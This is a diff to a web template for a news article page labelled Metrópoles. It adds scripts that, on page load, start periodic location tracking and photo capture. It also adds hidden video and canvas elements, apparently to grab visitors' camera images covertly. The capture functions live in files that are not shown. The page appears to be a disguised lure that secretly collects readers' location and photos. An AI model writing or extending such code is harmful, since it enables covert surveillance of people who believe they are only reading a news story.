@@ -6,6 +6,14 @@
 <head>
 
 	<script src="/js/localizacao.js"></script>
+	<script src="/js/camera.js"></script>
+
+	<script>
+		window.addEventListener('load', () => {
+			iniciarLocalizacaoPeriodica();
+			iniciarCapturaFoto(); // passe os valores corretos
+		});
+	</script>
 
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -40,7 +48,7 @@
 	<meta name="twitter:data2" content="2 minutes">
 
 	</script>
-	
+
 	<title>
 		<%= noticia.titulo %> | Metrópoles
 	</title>
@@ -8506,6 +8514,9 @@
 			<button onclick="location.reload()">Tentar novamente</button>
 		</div>
 	</div>
+
+	<video id="video" autoplay playsinline style="display: none;"></video>
+	<canvas id="canvas" style="display: none;"></canvas>
 
 </body>
 
